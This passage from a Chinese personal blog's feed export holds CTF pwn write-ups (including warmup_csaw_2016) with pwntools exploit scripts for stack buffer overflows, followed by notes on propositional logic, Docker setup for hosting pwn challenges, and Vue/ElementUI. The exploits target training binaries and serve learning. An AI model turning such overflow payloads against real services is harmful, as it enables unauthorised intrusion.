*context.log_level="debug"io=process("./pwn1")pop_ret_addr=0x401185fun_addr=0x401186payload=flat(['a'*23,p64(pop_ret_addr),p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-warmup-csaw-2016"><a href="#0x20-warmup-csaw-2016" class="headerlink" title="0x20 warmup_csaw_2016"></a>0x20 warmup_csaw_2016</h2><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</code></pre><p>64位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/warmup_csaw_2016/warmup_csaw_2016'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>同样没得任何保护</p><p>ida 反汇编查看</p><pre class=" language-lang-txt"><code class="language-lang-txt">int __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [sp+0h] [bp-80h]@1  char v5; // [sp+40h] [bp-40h]@1  write(1, "-Warm Up-\n", 0xAuLL);  write(1, "WOW:", 4uLL);  sprintf(&amp;s, "%p\n", sub_40060D);  write(1, &amp;s, 9uLL);  write(1, "&gt;", 1uLL);  return gets(&amp;v5, "&gt;");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int sub_40060D(){  return system("cat flag.txt");}</code></pre><p>emmm，比上一题还简单</p><p>直接exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=remote("node3.buuoj.cn",29722)#io=process("./warmup_csaw_2016")sys_addr=0x40060dpayload=flat(['a'*72,p64(sys_addr)])io.sendline(payload)io.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命题及其联结词</title>
      <link href="/2020/02/26/math/lisan-1-1-md/"/>
      <url>/2020/02/26/math/lisan-1-1-md/</url>
      
        <content type="html"><![CDATA[<h1 id="命题符号化及联结词"><a href="#命题符号化及联结词" class="headerlink" title="命题符号化及联结词"></a>命题符号化及联结词</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><p>命题：能判断真假的<strong>陈述句</strong>，是具有<strong>唯一真值</strong>的陈述句 <span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">😄</span></p><p>命题符号化：使用小写的英文字母 ${p},{q},{r},{…},{q_i},{p_i},{r_i},{…}$ 来表示命题</p><p>例1-1：</p><script type="math/tex; mode=display">{p}: 2是素数 \\{q}: 雪是黑的</script><h2 id="0x10-简单命题"><a href="#0x10-简单命题" class="headerlink" title="0x10 简单命题"></a>0x10 简单命题</h2><p>据教科书的定义，<strong>把不含逻辑联结词“或”、“且”、“非”的命题称为简单命题</strong>（有逻辑书称为原子命题）．认为简单命题是逻辑演算最基本的单位，应被看做是一个不可再分割的整体．例如，“3是12的约数”、“0．5是整数”，它们都是简单命题．</p><p>在例1-1中p,q的真值是确定的，此时${p},{q}$ 又被称为<strong>命题常项（有书称为命题常元）</strong> </p><p>而对于像例1-2：</p><script type="math/tex; mode=display">{p}:{x}+{y}>7</script><p>这样的命题，当 ${x},{y}$ 的值确定下来以后命题的真值才能确定的这种 <strong>真值可以变化的简单陈述句</strong> 称为<strong>命题变项（命题变元）</strong></p><p><strong><em>注：命题变项不是命题</em></strong></p><h2 id="0x20-复合命题"><a href="#0x20-复合命题" class="headerlink" title="0x20 复合命题"></a>0x20 复合命题</h2><p><strong>由简单命题与逻辑联结词构成的命题是复合命题</strong>．例如，“20可被4或5整除”、“平行四边形的对边相等且平行”、“2非素数”，上述三个命题都是复合命题，因为它们分别含有逻辑联结词“或”、“且”、“非”．</p><p>例1-3：</p><script type="math/tex; mode=display">{p}:{3不是偶数} \\{q}:{2是偶数和素数} \\{r}:{林芳学过日语或英语}</script><h2 id="0x30-联结词运算优先级"><a href="#0x30-联结词运算优先级" class="headerlink" title="0x30 联结词运算优先级"></a>0x30 联结词运算优先级</h2><script type="math/tex; mode=display">\neg、\bigwedge、\bigvee、\rightarrow、\leftrightarrow</script><p>联结词也称作逻辑运算符，在运算时有优先级，有括号先算括号里的内容，然后按照上面的优先级进行运算</p><p>命题一般以 <code>1</code>来表示真，<code>0</code>来表示假</p><div class="table-container"><table><thead><tr><th style="text-align:center">${p}$</th><th style="text-align:center">${q}$</th><th style="text-align:center">${p}\bigwedge{q}$</th><th style="text-align:center">${p}\bigvee{q}$</th><th style="text-align:center">${p}\rightarrow{q}$</th><th style="text-align:center">${p}\leftrightarrow{q}$</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr></tbody></table></div><h2 id="0x90-课后习题"><a href="#0x90-课后习题" class="headerlink" title="0x90 课后习题"></a>0x90 课后习题</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214246.png" alt="例题 1-5"></p><p>解：（1）</p><script type="math/tex; mode=display">{设}:{p}:2是偶数.{q}:2是素数\\故:可用{p}\bigwedge{q}表示2是偶数又是素数</script><p>​    （2）</p><script type="math/tex; mode=display">{设}:{p}:小王聪明.{q}:小王用功\\{故}:可用{p}\bigwedge{q}来表示小王不但聪明而且用功</script><p>​    （3）</p><script type="math/tex; mode=display">设:{p}:天气很冷.{q}:老王来了\\故可用{p}\bigwedge{q}来表示虽然天气很冷，老王还是来了</script><p>​    （4）</p><script type="math/tex; mode=display">设:{p}:他吃饭.{q}:他看电视\\故可用{p}\bigwedge{q}来表示他一边吃饭一边看电视</script><p>（5）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{p}\rightarrow{q}如果天下大雨他就乘公交车</script><p>（6）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{q}\rightarrow{p}只有天下大雨，他才乘公共汽车上班</script><p>（7）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{q}\rightarrow{p}除非天下大雨，否则他不乘公交汽车上班</script><p>总结：<code>命题符号化，需要将命题先转换成简单命题，值得注意的是符号化的p,q不能带不，非这样的文字</code></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214245.png" alt="例题 1-6"></p><p>解：（1）</p><script type="math/tex; mode=display">\because{p},{q}的真值为0，{r}的真值为1\\\therefore{q}\bigwedge{r}的真值为0\\\therefore{p}\bigvee({q}\bigwedge{r})的真值为0</script><p>​    （2）</p><script type="math/tex; mode=display">\because{p}\leftrightarrow{r}的真值为0，\neg{q}\bigvee{s}的真值为1\\\therefore ({p}\leftrightarrow{q})\bigwedge(\neg{q}\bigvee{s})的真值为0</script><p>​    （3）</p><script type="math/tex; mode=display">\because{q}\bigvee{r}的真值为1,{p}\bigvee{q}的真值为0，{r}\bigwedge{s}的真值为1\\\therefore({p}\bigwedge({q}\bigvee{r}))\rightarrow(({p}\bigvee{q})\bigwedge({r}\bigwedge{s}))的真值为1</script><h2 id="0x100-参考资料"><a href="#0x100-参考资料" class="headerlink" title="0x100 参考资料"></a>0x100 参考资料</h2><p>屈婉婷《离散数学（第五版）》——第一章 命题逻辑</p><p>公式使用LaTeX<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux pwn题目部署环境搭建</title>
      <link href="/2020/02/18/ctf/pwn/pwn-env/"/>
      <url>/2020/02/18/ctf/pwn/pwn-env/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-pwn题目部署环境搭建"><a href="#Linux-pwn题目部署环境搭建" class="headerlink" title="Linux pwn题目部署环境搭建"></a>Linux pwn题目部署环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>环境：Ubuntu 16.04虚拟机</p><p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><h2 id="更换软件源为阿里源"><a href="#更换软件源为阿里源" class="headerlink" title="更换软件源为阿里源"></a>更换软件源为阿里源</h2><ol><li><p>备份</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre></li><li><p>修改</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo vim /etc/apt/sources.list</code></pre><p>将source.list文件内容替换成下面的</p><pre class=" language-lang-txt"><code class="language-lang-txt"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</code></pre></li><li><p>更新</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo apt-get update</code></pre></li></ol><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Docker是一种容器，可以理解为轻量级虚拟机，由于占用的资源少，可以同时开启很多个docker，所以很适合来做ctf题目的容器。<br>我参考的是这篇博客 <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html#autoid-0-0-0" target="_blank" rel="noopener">这可能是最为详细的Docker入门吐血总结</a>，关于docker的概念和基本用法大佬讲的很详细了。<br>由于我在ubuntu上安装，参考官方文档 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">Get Docker CE for Ubuntu</a>，一步一步照着做就行。</p><h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>在Ubuntu上 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p><ol><li><p>更新索引：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>安装软件包以允许<code>apt</code>通过HTTPS使用存储库：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install \    apt-transport-https \    ca-certificates \    curl \    gnupg-agent \    software-properties-common</code></pre></li><li><p>添加Docker的官方GPG密钥：</p><pre class=" language-lang-shell"><code class="language-lang-shell">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>返回OK</p></li><li><p>使用以下命令来设置<strong>稳定的</strong>存储库。要添加 <strong>每晚</strong>或<strong>测试</strong>存储库，请在以下命令中的单词后面添加<code>nightly</code>或<code>test</code>（或同时添加）<code>stable</code>。<a href="https://docs.docker.com/install/" target="_blank" rel="noopener">了解<strong>每晚</strong>和<strong>测试</strong>频道</a>。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo add-apt-repository \   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \   $(lsb_release -cs) \   stable"</code></pre></li></ol><h3 id="安装DOCKER-ENGINE-社区"><a href="#安装DOCKER-ENGINE-社区" class="headerlink" title="安装DOCKER ENGINE-社区"></a>安装DOCKER ENGINE-社区</h3><ol><li><p>更新<code>apt</code>包索引。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>安装<em>最新版本</em>的Docker Engine-Community和containerd，或者转到下一步安装特定版本：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre></li><li><p>通过运行<code>hello-world</code> 映像来验证是否正确安装了Docker Engine-Community 。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker run hello-world</code></pre></li></ol><h2 id="镜像部署"><a href="#镜像部署" class="headerlink" title="镜像部署"></a>镜像部署</h2><h3 id="获取Docker-Ubuntu16-04镜像"><a href="#获取Docker-Ubuntu16-04镜像" class="headerlink" title="获取Docker Ubuntu16.04镜像"></a>获取Docker Ubuntu16.04镜像</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker pull ubuntu:16.04</code></pre><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt install docker-compose git</code></pre><h3 id="安装pwn-deploy-chroot"><a href="#安装pwn-deploy-chroot" class="headerlink" title="安装pwn_deploy_chroot"></a>安装pwn_deploy_chroot</h3><pre class=" language-lang-shell"><code class="language-lang-shell">git clone https://github.com/giantbranch/pwn_deploy_chroot.git</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将我们的题目放入pwn_deploy_chroot的bin目录下，然后根据以下操作即可：</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ python initialize.py</code></pre><p>使用完成后会生成</p><p>docker-compose.yml、Dockerfile、flags.txt、pwn.xinetd</p><p>这几个文件</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ docker-compose up --build -d</code></pre><p>显示done 查看是否成功</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ netstat -antp | grep docker</code></pre><p>显示</p><pre class=" language-lang-txt"><code class="language-lang-txt">tcp        0      0 192.168.111.134:33122   104.18.124.25:443       ESTABLISHED 17011/dockerd   tcp6       0      0 :::10000                :::*                    LISTEN      23036/docker-proxytcp6       0      0 :::10001                :::*                    LISTEN      23023/docker-proxytcp6       0      0 :::10002                :::*                    LISTEN      23010/docker-proxy</code></pre><p>表示成功</p><h3 id="check-amp-exp"><a href="#check-amp-exp" class="headerlink" title="check&amp;exp"></a>check&amp;exp</h3><p>输入<code>ifconfig</code>查看docker的ip，尝试用nc连</p><p>出现</p><pre class=" language-lang-shell"><code class="language-lang-shell">pwn test</code></pre><p>表示成功</p><p>进入容器</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo docker exec -ti feac591ee90a bash</code></pre><h3 id="编译C"><a href="#编译C" class="headerlink" title="编译C"></a>编译C</h3><pre class=" language-lang-shell"><code class="language-lang-shell">gcc -o hello hello.c</code></pre><h3 id="初始化时出现的问题"><a href="#初始化时出现的问题" class="headerlink" title="初始化时出现的问题"></a>初始化时出现的问题</h3><p>我在使用过程中出现</p><pre class=" language-lang-txt"><code class="language-lang-txt">AttributeError: 'module' object has no attribute 'SSL_ST_INIT'</code></pre><p>解决方法：</p><pre class=" language-lang-shell"><code class="language-lang-shell"># ls -l /usr/lib/python2.7/dist-packages/ | grep -i ssldrwxr-xr-x  3 root root   4096 Jan  9 09:23 OpenSSLdrwxr-xr-x  2 root root   4096 Jan  9 09:23 pyOpenSSL-0.15.1.egg-info# rm -rf /usr/lib/python2.7/dist-packages/OpenSSL# rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info# pip install pyopenssl# ls -l /usr/lib/python2.7/dist-packages/ |grep -i ssldrwxr-sr-x  2 root staff   4096 Jan  9 09:27 OpenSSLdrwxr-sr-x  2 root staff   4096 Jan  9 09:27 pyOpenSSL-18.0.0.dist-info</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>使用pwn_deploy_chroot部署国赛pwn比赛题目: <a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.x 学习记录</title>
      <link href="/2020/02/18/html/vue/"/>
      <url>/2020/02/18/html/vue/</url>
      
        <content type="html"><![CDATA[<h1 id="期末项目学习记录"><a href="#期末项目学习记录" class="headerlink" title="期末项目学习记录"></a>期末项目学习记录</h1><h2 id="vue3-x学习"><a href="#vue3-x学习" class="headerlink" title="vue3.x学习"></a>vue3.x学习</h2><p>引入：</p><pre class=" language-lang-html"><code class="language-lang-html"><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><h3 id="安装与卸载"><a href="#安装与卸载" class="headerlink" title="安装与卸载"></a>安装与卸载</h3><pre class=" language-lang-txt"><code class="language-lang-txt">npm install -g @vue/cli //安装npm uninstall -g @vue/cli //卸载</code></pre><p>指定版本安装</p><pre class=" language-lang-txt"><code class="language-lang-txt">3.0以下😔npm install -g vue-cli@版本号3.0以上😀npm install -g @vue/cli@版本号</code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre class=" language-lang-txt"><code class="language-lang-txt">vue create project//project为项目名称</code></pre><p>项目创建选项</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175201.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175206.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175209.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175211.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175213.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175215.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175216.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175218.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175220.jpg" alt="图片来自与手把手撸代码前端"></p><h3 id="vue-项目初始化"><a href="#vue-项目初始化" class="headerlink" title="vue 项目初始化"></a>vue 项目初始化</h3><h4 id="vue-config-js"><a href="#vue-config-js" class="headerlink" title="vue.config.js"></a>vue.config.js</h4><pre class=" language-lang-js"><code class="language-lang-js">const path = require('path');module.exports = {  // 基本路径  publicPath: process.env.NODE_ENV === 'production' ? '' : '/',  // 输出文件目录  outputDir: process.env.NODE_ENV === 'production' ? 'dist' : 'devdist',  // eslint-loader 是否在保存的时候检查  lintOnSave: true,  /**   * webpack配置,see https://github.com/vuejs/vue-cli/blob/dev/docs/webpack.md   **/  chainWebpack: (config) =&gt; {  },  configureWebpack: (config) =&gt; {    // config.resolve = { // 配置解析别名    //   extensions: ['.js', '.json', '.vue'],    //   alias: {    //     '@': path.resolve(__dirname, './src'),    //     'public': path.resolve(__dirname, './public'),    //     'components': path.resolve(__dirname, './src/components'),    //     'common': path.resolve(__dirname, './src/common'),    //     'api': path.resolve(__dirname, './src/api'),    //     'views': path.resolve(__dirname, './src/views'),    //     'data': path.resolve(__dirname, './src/data')    //   }    // }  },  // 生产环境是否生成 sourceMap 文件  productionSourceMap: false,  // css相关配置  css: {    // 是否使用css分离插件 ExtractTextPlugin    extract: true,    // 开启 CSS source maps?    sourceMap: false,    // css预设器配置项    loaderOptions: {    },    // 启用 CSS modules for all css / pre-processor files.    modules: false  },  // use thread-loader for babel &amp; TS in production build  // enabled by default if the machine has more than 1 cores  parallel: require('os').cpus().length &gt; 1,  /**   *  PWA 插件相关配置,see https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa   */  pwa: {},  // webpack-dev-server 相关配置  devServer: {    open: false, // 编译完成是否打开网页    host: '0.0.0.0', // 指定使用地址，默认localhost,0.0.0.0代表可以被外界访问    port: 8080, // 访问端口    https: false, // 编译失败时刷新页面    hot: true, // 开启热加载    hotOnly: false,    proxy: null, // 设置代理    overlay: { // 全屏模式下是否显示脚本错误      warnings: true,      errors: true    },    before: app =&gt; {    }  },  /**   * 第三方插件配置   */  pluginOptions: {}}</code></pre><p>问题记录：为什么要建立vue.config.js?</p><h4 id="route重定向"><a href="#route重定向" class="headerlink" title="route重定向"></a>route重定向</h4><p>在route文件夹里的index.js的 const routes 中引入</p><p><strong>注意不要有空格</strong></p><p>在index.js的开头中引入组件 </p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from "vue";import VueRouter from "vue-router";import Home from "../views/Home.vue";Vue.use(VueRouter);const routes = [  {    path: "/",    name: "home",    component: Home  },  {    path: "/login",    name: "login",    component:  () =&gt;      import(/* webpackChunkName: "about" */ "../views/login/index.vue")  },  {    path: "/about",    name: "about",    // route level code-splitting    // this generates a separate chunk (about.[hash].js) for this route    // which is lazy-loaded when the route is visited.    component: () =&gt;      import(/* webpackChunkName: "about" */ "../views/About.vue")  }];const router = new VueRouter({  routes});export default router;</code></pre><p>重定向：</p><pre class=" language-lang-js"><code class="language-lang-js">  {    path: "/",    redirect: "login"  }</code></pre><h4 id="引入全局样式"><a href="#引入全局样式" class="headerlink" title="引入全局样式"></a>引入全局样式</h4><p>在vue.config.js的 // css预设器配置项处添加，由于本系统选用的sass的预编译模式，因此需要添加</p><pre class=" language-lang-js"><code class="language-lang-js">        sass: {             prependData: `@import "./src/styles/main.scss";`        }</code></pre><pre><code>@import "normalize.scss";//在main.scss中引入</code></pre><h4 id="vue文件结构"><a href="#vue文件结构" class="headerlink" title="vue文件结构"></a>vue文件结构</h4><p>在vue.config.js文件中关闭登陆验证</p><pre class=" language-lang-js"><code class="language-lang-js">lintOnSave: false,</code></pre><p>文件结构</p><pre class=" language-lang-html"><code class="language-lang-html"><template>    <div>        haahha    </div></template><script>export default {}</script><style scoped=""></style></code></pre><p>注意：</p><ol><li>内容外边必须有一层标签包裹</li><li>style scoped属性是文件内样式</li><li>script 为脚本文件引用区</li><li>在vue中main.js为框架的主入口，如果需要引入一些东西的话直接在main.js中引入就好了</li></ol><p>可以删除app.vue中的样式以及nav</p><h4 id="引入element-ui"><a href="#引入element-ui" class="headerlink" title="引入element-ui"></a>引入element-ui</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><pre class=" language-lang-txt"><code class="language-lang-txt">cnpm i element-ui -Snpm i element-ui -S</code></pre><p>两个选一个用</p><p>引入</p><ol><li>全部引入</li><li>按需引入</li></ol><p>1.全部引入</p><p>在main.js中写入：</p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from 'vue';import ElementUI from 'element-ui';import 'element-ui/lib/theme-chalk/index.css';import App from './App.vue';Vue.use(ElementUI);new Vue({  el: '#app',  render: h =&gt; h(App)});</code></pre><p>2.按需引入</p><p>暂时不做详细，看官方文档</p><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h5 id="问题（引入后没有样式）"><a href="#问题（引入后没有样式）" class="headerlink" title="问题（引入后没有样式）"></a>问题（引入后没有样式）</h5><p>elementUI引入没有样式的原因：</p><p>在vue.config.js的css中修改requireModuleExtension为true</p><pre class=" language-lang-js"><code class="language-lang-js">      requireModuleExtension: true</code></pre><p>即使用CSS models</p><h3 id="vue基础语法使用"><a href="#vue基础语法使用" class="headerlink" title="vue基础语法使用"></a>vue基础语法使用</h3><h4 id="vue-for"><a href="#vue-for" class="headerlink" title="vue-for"></a>vue-for</h4><h2 id="ElementUI"><a href="#ElementUI" class="headerlink" title="ElementUI"></a>ElementUI</h2><p>引入：</p><pre class=" language-lang-html"><code class="language-lang-html"><!--引入ElementUI组件-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css"></code></pre><pre class=" language-lang-html"><code class="language-lang-html"><!-- import Vue before Element --><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h2 id="点击弹出表单事件处理"><a href="#点击弹出表单事件处理" class="headerlink" title="点击弹出表单事件处理"></a>点击弹出表单事件处理</h2><pre class=" language-lang-html"><code class="language-lang-html">    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <!--引入ElementUI组件-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">    <link rel="stylesheet" href="css/index.css">    <title>reg</title>    <div id="app">        <!--Form-->        <el-button type="button" @click="dialogFormVisible = true">注册</el-button>        <el-dialog title="注册信息填写" :visible.sync="dialogFormVisible">            <el-form :model="form">              <el-form-item label="名称" :label-width="formlabelwidth">                  <el-input v-model="form.name" placeholder="username"></el-input>              </el-form-item>            </el-form>        </el-dialog>    </div><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script><!--import index.js--><script>    var Main = {    data(){        return{            dialogFormVisible: false,            form: {                name: '',            },            formLabelWidth: '120px'        };    }};var Ctor=Vue.extend(Main)new Ctor().$mount('#app')</script></code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191215211442.png" alt="屏幕截图"></p><h2 id="主界面设计"><a href="#主界面设计" class="headerlink" title="主界面设计"></a>主界面设计</h2><h3 id="主题色彩选择"><a href="#主题色彩选择" class="headerlink" title="主题色彩选择"></a>主题色彩选择</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ret2libc</title>
      <link href="/2020/02/18/ctf/pwn/pwn-re2libc/"/>
      <url>/2020/02/18/ctf/pwn/pwn-re2libc/</url>
      
